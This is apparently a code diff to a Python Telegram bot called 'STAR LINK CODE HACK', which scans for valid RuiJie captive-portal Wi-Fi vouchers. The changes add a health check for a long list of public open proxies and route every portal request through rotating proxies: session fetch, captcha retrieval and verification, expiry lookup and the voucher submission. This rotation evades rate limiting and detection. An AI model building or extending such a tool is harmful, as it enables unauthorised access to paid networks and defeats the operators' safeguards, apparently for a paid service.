@@ -1,6 +1,6 @@
 #!/usr/bin/env python3
 """
-STAR LINK CODE HACK — Professional Edition
+STAR LINK CODE HACK — Professional Edition (Real-time Proxy Checker Integrated)
 ============================================
 Production-grade RuiJie captive-portal voucher scanner.
 
@@ -54,7 +54,7 @@ KEY_RECHECK_INTERVAL: float = 600.0
 
 SUCCESS_FILE_TARGETS: Tuple[str, ...] = ADMINS
 
-# Optional outbound proxies (configured from proxy list)
+# Configured Proxy List with user's provided proxies
 PROXY_LIST: List[str] = [
     "http://45.91.248.107:80",
     "socks5://45.84.13.153:1080",
@@ -149,7 +149,6 @@ PROXY_LIST: List[str] = [
     "http://160.19.18.219:8080",
     "http://157.10.97.91:7000",
     "http://45.118.35.169:8080",
-    "http://104.200.152.30:4145",
     "http://103.182.22.58:8000",
     "http://180.180.156.92:80",
     "http://154.18.255.25:1111",
@@ -347,94 +346,6 @@ PROXY_LIST: List[str] = [
     "http://23.95.91.167:80",
     "http://103.217.224.29:8089",
     "http://201.4.69.113:8080",
-    "http://45.232.0.2:8080",
-    "http://103.35.216.34:8080",
-    "http://159.195.194.242:8080",
-    "http://192.203.0.250:999",
-    "http://38.58.66.167:999",
-    "http://194.150.110.134:80",
-    "http://103.172.42.179:1111",
-    "http://103.41.88.182:83",
-    "http://8.219.94.23:7890",
-    "http://181.78.176.147:999",
-    "http://204.168.225.55:8888",
-    "http://103.48.68.142:83",
-    "http://185.196.61.251:8081",
-    "http://103.112.163.131:8080",
-    "http://91.185.20.162:8080",
-    "http://45.71.185.217:9991",
-    "http://45.190.85.5:999",
-    "http://202.47.188.205:1111",
-    "http://38.156.235.34:999",
-    "http://154.59.56.74:999",
-    "http://103.82.246.23:6080",
-    "http://186.101.251.197:8080",
-    "http://103.81.110.137:3125",
-    "http://190.12.95.170:47029",
-    "http://78.17.98.235:8080",
-    "http://157.66.192.114:8080",
-    "http://186.33.54.194:999",
-    "http://41.65.162.72:1976",
-    "http://103.82.246.21:6080",
-    "http://39.109.113.97:4090",
-    "http://20.33.10.79:443",
-    "http://186.194.160.122:999",
-    "http://157.10.226.93:8080",
-    "http://111.206.4.163:18888",
-    "http://189.124.90.17:7171",
-    "http://171.241.0.216:13023",
-    "http://206.135.47.110:999",
-    "http://45.174.243.160:999",
-    "http://181.188.203.40:999",
-    "http://103.227.187.23:8080",
-    "http://103.55.22.226:8080",
-    "http://103.48.69.99:83",
-    "http://45.191.235.53:999",
-    "http://1.20.101.17:8080",
-    "http://112.169.99.71:8054",
-    "http://38.194.250.66:999",
-    "http://103.217.179.216:8080",
-    "http://74.103.66.15:80",
-    "http://78.155.66.90:8080",
-    "http://200.59.191.242:999",
-    "http://194.67.120.148:10808",
-    "http://179.63.6.167:999",
-    "http://1.4.141.44:8080",
-    "http://111.68.125.34:8080",
-    "http://171.241.0.216:30568",
-    "http://103.158.13.157:3125",
-    "http://157.66.67.16:8080",
-    "http://173.212.234.174:3128",
-    "http://118.69.176.114:8080",
-    "http://112.203.32.62:8082",
-    "http://103.247.21.83:8446",
-    "http://189.1.236.200:3128",
-    "http://49.13.22.249:10806",
-    "http://36.95.208.13:8080",
-    "http://118.71.227.154:2096",
-    "http://68.71.251.134:4145",
-    "http://103.174.122.120:8080",
-    "http://187.188.169.140:999",
-    "http://130.61.148.213:8888",
-    "http://180.180.156.126:8080",
-    "http://124.217.0.75:8082",
-    "http://180.191.98.117:8080",
-    "http://131.196.50.128:8080",
-    "http://181.49.100.190:8080",
-    "http://156.155.50.93:8080",
-    "http://176.88.65.164:8080",
-    "http://103.152.238.77:1080",
-    "http://180.180.156.68:80",
-    "http://170.244.91.65:999",
-    "http://62.146.235.24:8080",
-    "http://103.127.92.161:8090",
-    "http://103.83.28.216:5678",
-    "http://1.20.101.17:80",
-    "http://103.189.250.89:8090",
-    "http://148.224.7.78:999",
-    "http://23.95.91.167:80",
-    "http://103.217.224.29:8089",
-    "http://201.4.69.113:8080",
     "http://199.66.183.226:4145",
     "http://45.232.0.2:8080",
     "http://157.245.129.129:10000",
@@ -520,9 +431,44 @@ PROXY_LIST: List[str] = [
     "http://62.146.235.24:8080",
     "http://103.127.92.161:8090"
 ]
-
 _proxy_index = 0
 _proxy_lock = asyncio.Lock()
+
+async def check_proxy_live(proxy_url: str) -> Optional[str]:
+    """Real-time live/dead check for a single proxy."""
+    timeout = aiohttp.ClientTimeout(total=4)
+    try:
+        async with aiohttp.ClientSession(timeout=timeout) as sess:
+            async with sess.get("https://httpbin.org/ip", proxy=proxy_url) as resp:
+                if resp.status == 200:
+                    return proxy_url
+    except Exception:
+        pass
+    return None
+
+async def refresh_live_proxies() -> None:
+    """Filter out dead proxies and keep only working ones at startup."""
+    global PROXY_LIST
+    if not PROXY_LIST:
+        return
+    log.info("Checking real-time proxy health for %d proxies...", len(PROXY_LIST))
+    tasks = [check_proxy_live(p) for p in PROXY_LIST]
+    results = await asyncio.gather(*tasks, return_exceptions=True)
+    live_list = [r for r in results if isinstance(r, str)]
+    if live_list:
+        PROXY_LIST[:] = live_list
+        log.info("Proxy health check complete. Live working proxies: %d/%d", len(PROXY_LIST), len(tasks))
+    else:
+        log.warning("No live proxies responded; keeping original list as fallback.")
+
+async def get_next_proxy() -> Optional[str]:
+    global _proxy_index
+    if not PROXY_LIST:
+        return None
+    async with _proxy_lock:
+        proxy = PROXY_LIST[_proxy_index]
+        _proxy_index = (_proxy_index + 1) % len(PROXY_LIST)
+        return proxy
 
 # ============================================================
 # LOGGING
@@ -1620,8 +1566,9 @@ async def get_session_id(sess: aiohttp.ClientSession, session_url: str,
         "referer": url,
         "user-agent": _UA_HTML,
     }
+    proxy_url = await get_next_proxy()
     try:
-        async with sess.get(url, headers=headers, allow_redirects=True) as req:
+        async with sess.get(url, headers=headers, proxy=proxy_url, allow_redirects=True) as req:
             final = str(req.url)
             m = re.search(r"[?&]sessionId=([a-zA-Z0-9]+)", final)
             return m.group(1) if m else previous_session_id
@@ -1640,9 +1587,10 @@ async def Captcha_Image(sess: aiohttp.ClientSession, session_id: str) -> bytes:
         "user-agent": _UA_HTML,
     }
     params = {"sessionId": session_id, "_t": str(time.time())}
+    proxy_url = await get_next_proxy()
     async with sess.get(
         "https://portal-as.ruijienetworks.com/api/auth/captcha/image",
-        params=params, headers=headers,
+        params=params, headers=headers, proxy=proxy_url,
     ) as req:
         return await req.read()
 
@@ -1656,10 +1604,11 @@ async def Varify_Captcha(sess: aiohttp.ClientSession, session_id: str, text: str
         "user-agent": _UA_HTML,
     }
     payload = {"sessionId": session_id, "authCode": text}
+    proxy_url = await get_next_proxy()
     try:
         async with sess.post(
             "https://portal-as.ruijienetworks.com/api/auth/captcha/verify",
-            headers=headers, json=payload,
+            headers=headers, json=payload, proxy=proxy_url,
         ) as req:
             data = await req.json()
             return session_id if data.get("success") else None
@@ -1709,6 +1658,7 @@ async def Code_Expires_Date(active_id: str) -> Tuple[str, Any]:
         "x-requested-with": "XMLHttpRequest",
     }
     timeout = aiohttp.ClientTimeout(total=10)
+    proxy_url = await get_next_proxy()
     try:
         async with aiohttp.ClientSession(
             connector=_connector, connector_owner=False,
@@ -1716,7 +1666,7 @@ async def Code_Expires_Date(active_id: str) -> Tuple[str, Any]:
         ) as s:
             for url in paths:
                 try:
-                    async with s.get(url, headers=headers) as req:
+                    async with s.get(url, headers=headers, proxy=proxy_url) as req:
                         if req.status != 200:
                             continue
                         resp = await req.json()
@@ -1765,6 +1715,7 @@ async def perform_check(session_url: str, code: str, chat_id: int,
 
     for attempt in range(3):
         timeout = aiohttp.ClientTimeout(total=30)
+        proxy_url = await get_next_proxy()
         try:
             async with aiohttp.ClientSession(
                 connector=_connector, connector_owner=False,
@@ -1808,7 +1759,7 @@ async def perform_check(session_url: str, code: str, chat_id: int,
                     f"?RES=./../expand/res/mrlev58jlgslg49ervu&IS_EG=0&sessionId={session_id}"
                 )
 
-                async with sess.post(_POST_URL, json=payload, headers=post_headers) as req:
+                async with sess.post(_POST_URL, json=payload, headers=post_headers, proxy=proxy_url) as req:
                     response = await req.text()
 
         except Exception as e:
@@ -2022,7 +1973,7 @@ async def check_session_url_improved(session_url: str, use_proxy: bool = False) 
         "accept-language": "en-US,en;q=0.9",
         "user-agent": _UA_HTML,
     }
-    proxy = None  # proxies disabled by default
+    proxy = await get_next_proxy()
     if session is None:
         return False
     try:
@@ -2083,8 +2034,6 @@ async def start_polling():
     backoff = 5
     while True:
         try:
-            # timeout=30: Telegram long-poll window
-            # request_timeout=90: aiohttp must survive past Telegram's window
             await bot.infinity_polling(timeout=30, request_timeout=90)
             return
         except asyncio.CancelledError:
@@ -2130,6 +2079,9 @@ async def _on_shutdown():
 async def main():
     setup_logging()
     log.info("Starting STAR LINK bot …")
+
+    # Real-time proxy live/dead check before starting bot services
+    await refresh_live_proxies()
 
     _get_conn()
     await load_paid_users()
